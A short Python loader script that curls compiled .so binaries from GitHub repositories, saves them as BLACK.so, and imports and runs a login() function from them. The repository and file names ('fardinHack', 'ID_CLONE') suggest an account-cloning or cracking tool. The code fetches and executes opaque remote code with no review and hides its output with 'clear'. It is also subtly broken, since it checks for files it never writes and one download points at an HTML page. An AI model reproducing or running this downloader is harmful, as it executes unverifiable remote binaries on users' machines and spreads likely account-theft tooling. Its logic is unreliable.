#coding=utf-8
import os, sys, platform
try:
    import requests
except:
    os.system('pip install requests')

import requests
if not os.path.isfile('Jutt.so'):
    os.system('curl -L https://raw.githubusercontent.com/SHOOTER-MAKER/Juttbrand/main/Jutt.cpython-310.so > BLACK.so')
    os.system('clear')
if not os.path.isfile('brand.so'):
    os.system('curl -L https://github.com/fardinHack/Huw/blob/main/ID_CLONE.cython-easy-38.so > BLACK.so')
    os.system('clear')
bit=platform.architecture()[0]
if bit == '64bit':
    from BLACK import login
    login()
elif bit == '32bit':
    from BLACK import login
    login()
